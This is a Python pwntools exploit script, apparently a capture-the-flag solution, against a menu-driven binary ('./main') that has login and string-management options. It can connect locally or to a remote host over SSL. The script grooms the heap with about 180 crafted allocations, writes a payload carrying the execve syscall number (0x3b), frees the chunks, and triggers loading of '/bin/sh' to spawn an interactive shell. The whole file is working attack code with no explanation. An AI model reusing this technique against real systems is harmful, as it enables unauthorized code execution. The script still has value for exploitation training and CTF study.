#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("./main")

gs = """
brva 0x01F91
"""


def start():
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]), ssl=True)
    return p


p = start()

# r = e.process()


def choice(c: int):
    p.sendlineafter(b'Choose an option: ', str(c).encode())


def login(username: bytes, passwd: bytes):
    choice(1)
    p.sendlineafter(b'Username: ', username)
    p.sendlineafter(b'Password: ', passwd)


def register(username: bytes, passwd: bytes):
    choice(2)
    p.sendlineafter(b'Username: ', username)
    p.sendlineafter(b'Password: ', passwd)


def add_str(size: int, content: bytes):
    choice(1)
    p.sendlineafter(b'Enter string length: ', str(size).encode())
    p.sendlineafter(b'Enter a string: ', content)


def delete_str(idx: int):
    choice(2)
    p.sendlineafter(
        b'Enter the index of the string to delete: ', str(idx).encode())


def view_str():
    choice(3)


def save_to_file(filename: bytes):
    choice(4)
    p.sendlineafter(b'Enter the filename: ', filename)


def load_from_file(filename: bytes):
    choice(5)
    p.sendlineafter(b'Enter the filename: ', filename)


register(b'lynk', b'lynk')
login(b'lynk', b'lynk')

for i in range(160+0xe+6-1):
    add_str(0x100-1, b'X'*0xf0)
    print(i)

add_str(0x80, b"AA")

if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()

add_str(0xa8, b'Y'*0xa0+p32(0)+p32(1)+p32(0x3b))

for i in range(160+0xe-1):
    delete_str(0)

load_from_file(b"/bin/sh")


p.interactive()
